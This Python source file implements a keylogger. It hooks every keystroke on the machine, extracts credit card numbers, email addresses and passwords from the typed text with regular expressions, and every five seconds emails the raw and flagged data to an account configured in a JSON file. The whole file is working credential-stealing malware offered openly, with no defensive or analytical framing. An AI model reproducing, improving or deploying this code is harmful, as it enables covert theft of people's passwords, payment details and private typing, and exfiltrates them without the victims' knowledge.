import keyboard
import time
from emailer import Emailer
import json
import re

CREDIT_CARD_NUMBER_REGEXP = re.compile("[0-9]{4}[ ]?[0-9]{4}[ ]?[0-9]{4}")


class Keylogger:
    def __init__(self, email: str, password: str) -> None:
        self.email = email
        self.password = password
        # Local data to use in the email
        self.local_buffer = ""
        self.local_buffer_raw = ""
        self.shift_keys = 0
        self.special_keys = {
            "space": " ",
            "shift": "",
            "right shift": "",
            "enter": "\\n",
        }

    # Handles a key pressed by the user and adds it to the local buffer (raw and formatted)
    def __handle_key_press(self, event):
        # On key down, add the key to the local buffer
        if event.event_type == "down":
            self.local_buffer_raw += event.name

            if event.name in self.special_keys:
                self.local_buffer += self.special_keys[event.name]
            else:
                self.local_buffer += (
                    event.name.capitalize() if self.shift_keys else event.name
                )

            if event.name == "shift" or event.name == "right shift":
                self.shift_keys += 1

        elif event.event_type == "up":
            if event.name == "shift" or event.name == "right shift":
                self.shift_keys -= 1

    # Gets any credit card info from the local buffer (credit card number, expiry date, cvv number)
    def __get_credit_card_info(self, buffer: str) -> list:
        credit_card_numbers = re.findall(CREDIT_CARD_NUMBER_REGEXP, buffer)

        return credit_card_numbers

    def __get_emails(self, buffer: str) -> list:
        emails = re.findall("[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+", buffer)

        return emails

    def __get_passwords(self, buffer: str) -> list:
        passwords_not_split = re.findall(
            "[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[com|ca|net]+(.*[\n|!CLICK])", buffer
        )
        passwords = []

        for password in passwords_not_split:
            sub_strings = password.split("!")
            passwords.append(sub_strings[0])

        return passwords

    # Flags the desired information from the buffer (passwords, emails, credit card numbers)
    def __flag_data(self, buffer: str) -> dict:
        # Check email with regex
        # Check digits
        formatted_local_buffer = {
            "loginInfo": [],
            "creditCardInfo": self.__get_credit_card_info(buffer),
            "emails": self.__get_emails(buffer),
            "passwords": self.__get_passwords(buffer),
        }

        return formatted_local_buffer

    # Emails the local buffer and the formatted / flagged data
    def __email_local_buffer(self, emailer: Emailer) -> bool:

        # Flag stuff
        flagged_objects = self.__flag_data(self.local_buffer)

        data = {
            "raw": self.local_buffer_raw,
            "formatted": self.local_buffer,
            "flagged": flagged_objects,
        }

        try:
            emailer.send_email("Keylogger Info", json.dumps(data))
            print("Email sent successfully")
            return True
        except Exception as e:
            print(e)
            return False
        finally:
            # Reset the local buffer
            # Keep the last characters of the last buffer so words aren't cut off
            if len(self.local_buffer) < 20:
                self.local_buffer = self.local_buffer[-len(self.local_buffer) :]
            else:
                self.local_buffer = self.local_buffer[-20:]
            self.local_buffer_raw = ""
            print("Reset local buffer")

    def run(self) -> None:
        keyboard.hook(self.__handle_key_press)

        emailer = Emailer(self.email, self.password)
        while True:
            time.sleep(5)
            self.__email_local_buffer(emailer)


if __name__ == "__main__":
    with open("./email_info.json", "r") as email_file:
        email_info = json.load(email_file)

    k = Keylogger(email_info["email"], email_info["applicationPassword"])
    k.run()
